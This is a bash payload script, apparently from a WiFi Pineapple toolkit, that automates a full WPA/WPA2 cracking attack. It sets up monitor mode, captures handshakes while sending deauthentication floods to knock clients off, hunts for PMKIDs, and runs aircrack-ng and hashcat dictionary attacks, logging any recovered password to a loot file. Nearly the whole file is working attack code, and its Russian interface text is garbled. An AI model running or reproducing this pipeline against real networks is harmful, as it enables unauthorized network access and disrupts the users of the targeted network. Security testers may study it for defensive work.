#!/bin/bash
. /root/payloads/library/nullsec-ui.sh
#═══════════════════════════════════════════════════════════════════════════════
# НЕГЕК - Быстрое истребление & Автоматические Пароль/Криптография
# Разработано: bad-antics
# 
# Автоматический WPA/WPA2 конвейер крацка - сканирование, перехват, крацка, победа
#═══════════════════════════════════════════════════════════════════════════════

# Autodetect the right wireless interface (exports $IFACE).
# Falls back to showing the pager error dialog if nothing is plugged in.
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
nullsec_require_iface || exit 1

source /mmc/nullsec/lib/nullsec-scanner.sh 2>/dev/null

LOOT_DIR="/mmc/nullsec/reaper"
WORDLIST="/mmc/nullsec/wordlists/master.txt"
mkdir -p "$LOOT_DIR"

PROMPT "    ╦═╗╔═╗╔═╗╔═╗╔═╗╦═╗
    ╠╦╝║╣ ╠═╣╠═╝║╣ ╠╦╝
    ╩╚═╚═╝╩ ╩╩  ╚═╝╩╚═
━━━━━━━━━━━━━━━━━━━━━━━━━
Automated Hash Harvester

Full attack pipeline:
Scan → Target → Capture
→ Crack → Victory

The password WILL fall.
━━━━━━━━━━━━━━━━━━━━━━━━━
Разработано: bad-antics"

PROMPT "МЕТОДЫ НЕГЕКА:

1. НЕГЬ НА 4-Way
   (WPA/WPA2 4-way)

2. Охота на PMKID
   (Атака без клиента)

3. Полная ассаля
   (Оба метода)

Выберите свою сицу..."

METHOD=$(NUMBER_PICKER "Метод (1-3):" 3)

# Выберите цель
nullsec_select_target
[ -z "$SELECTED_BSSID" ] && { ERROR_DIALOG "Нет цели!"; exit 1; }

CONFIRMATION_DIALOG "ОХОТЕсь НА:
$SELECTED_SSID
$SELECTED_BSSID
Канал: $SELECTED_CHANNEL

Начинать негек?"
[ $? -ne 0 ] && exit 0

INTERFACE="$IFACE"
airmon-ng check kill 2>/dev/null
airmon-ng start $INTERFACE >/dev/null 2>&1
MON_IF="${INTERFACE}mon"
[ ! -d "/sys/class/net/$MON_IF" ] && MON_IF="$INTERFACE"

iwconfig $MON_IF channel $SELECTED_CHANNEL 2>/dev/null

LOOT_FILE="$LOOT_DIR/reaper_$(date +%Y%m%d_%H%M%S).txt"
CAPTURE_FILE="$LOOT_DIR/capture_$(date +%Y%m%d_%H%M%S)"

cat > "$LOOT_FILE" << EOF
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 REAPER - Harvest Report
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Target: $SELECTED_SSID ($SELECTED_BSSID)
 Channel: $SELECTED_CHANNEL
 Method: $METHOD
 Started: $(date)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 NullSec Pineapple Suite | Разработано: bad-antics
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

EOF

HANDSHAKE_CAPTURED=0
PMKID_CAPTURED=0
PASSWORD=""

harvest_handshake() {
    LOG "Уходит негек..."
    SPINNER_START "Деаут & перехват..."
    
    # Start capture
    timeout 120 airodump-ng --bssid $SELECTED_BSSID -c $SELECTED_CHANNEL -w "$CAPTURE_FILE" $MON_IF 2>/dev/null &
    DUMP_PID=$!
    sleep 5
    
    # Deauth to force reconnection
    for i in {1..5}; do
        aireplay-ng --deauth 10 -a $SELECTED_BSSID $MON_IF 2>/dev/null
        sleep 5
        
        # Check for handshake
        if aircrack-ng "${CAPTURE_FILE}-01.cap" 2>/dev/null | grep -q "1 handshake"; then
            HANDSHAKE_CAPTURED=1
            echo "[$(date)] HANDSHAKE CAPTURED!" >> "$LOOT_FILE"
            kill $DUMP_PID 2>/dev/null
            break
        fi
    done
    
    SPINNER_STOP
}

harvest_pmkid() {
    LOG "Уходит PMKID..."
    SPINNER_START "Ожидание PMKID..."
    
    if command -v hcxdumptool &>/dev/null; then
        timeout 60 hcxdumptool -i $MON_IF -o "${CAPTURE_FILE}.pcapng" --filterlist_ap=$SELECTED_BSSID --filtermode=2 2>/dev/null
        
        if [ -f "${CAPTURE_FILE}.pcapng" ] && command -v hcxpcapngtool &>/dev/null; then
            hcxpcapngtool -o "${CAPTURE_FILE}.hash" "${CAPTURE_FILE}.pcapng" 2>/dev/null
            [ -s "${CAPTURE_FILE}.hash" ] && PMKID_CAPTURED=1
        fi
    else
        # Не требует tcpdump метод
        timeout 60 tcpdump -i $MON_IF -w "${CAPTURE_FILE}_pmkid.cap" "ether host $SELECTED_BSSID" 2>/dev/null
    fi
    
    [ $PMKID_CAPTURED -eq 1 ] && echo "[$(date)] PMKID ПЕРЕХВАЧЕН!" >> "$LOOT_FILE"
    
    SPINNER_STOP
}

crack_capture() {
    [ ! -f "$WORDLIST" ] && {
        echo "[$(date)] Нет словаря $WORDLIST" >> "$LOOT_FILE"
        return
    }
    
    LOG "Крацка..."
    SPINNER_START "Атака словарем..."
    
    if [ $HANDSHAKE_CAPTURED -eq 1 ]; then
        RESULT=$(aircrack-ng -w "$WORDLIST" -b $SELECTED_BSSID "${CAPTURE_FILE}-01.cap" 2>/dev/null)
        if echo "$RESULT" | grep -q "KEY FOUND"; then
            PASSWORD=$(echo "$RESULT" | grep "KEY FOUND" | sed 's/.*\[ //' | sed 's/ \].*//')
        fi
    fi
    
    if [ $PMKID_CAPTURED -eq 1 ] && command -v hashcat &>/dev/null; then
        hashcat -m 22000 "${CAPTURE_FILE}.hash" "$WORDLIST" --quiet 2>/dev/null
        PASSWORD=$(hashcat -m 22000 "${CAPTURE_FILE}.hash" --show 2>/dev/null | cut -d: -f2)
    fi
    
    SPINNER_STOP
}

case $METHOD in
    1) harvest_handshake ;;
    2) harvest_pmkid ;;
    3)
        harvest_pmkid
        [ $PMKID_CAPTURED -eq 0 ] && harvest_handshake
        ;;
esac

# Attempt crack if we got something
[ $HANDSHAKE_CAPTURED -eq 1 ] || [ $PMKID_CAPTURED -eq 1 ] && crack_capture

# Results
cat >> "$LOOT_FILE" << EOF

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 РЕЗУЛЬТАТЫ НЕГЕКА
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Цель: $SELECTED_SSID
 Негек: $([ $HANDSHAKE_CAPTURED -eq 1 ] && echo "ПОЛУЧЕН" || echo "Нет")
 PMKID: $([ $PMKID_CAPTURED -eq 1 ] && echo "ПОЛУЧЕН" || echo "Нет")
 Пароль: ${PASSWORD:-Не крачен}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 NullSec Pineapple Suite | Разработано: bad-antics
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
EOF

# Очистка
airmon-ng stop $MON_IF 2>/dev/null

if [ -n "$PASSWORD" ]; then
    PROMPT "  ☠ НЕГЕК УНИЧТОЖЕН ☠
━━━━━━━━━━━━━━━━━━━━━━━━━
ЦЕЛЬ ПОЛУЧЕНА!

SSID: $SELECTED_SSID
ПАРОЛЬ: $PASSWORD

Победа твоя.
━━━━━━━━━━━━━━━━━━━━━━━━━
Разработано: bad-antics"
else
    PROMPT "ОТЧЁТ НЕГЕКА
━━━━━━━━━━━━━━━━━━━━━━━━━
Негек на: $SELECTED_SSID

Негек: $([ $HANDSHAKE_CAPTURED -eq 1 ] && echo "ДА" || echo "НЕТ")
PMKID: $([ $PMKID_CAPTURED -eq 1 ] && echo "ДА" || echo "НЕТ")

Пароль не в словаре
или перехват неполный.

Хеш сохранён для
офлайн крацки.
━━━━━━━━━━━━━━━━━━━━━━━━━
Разработано: bad-antics"
fi
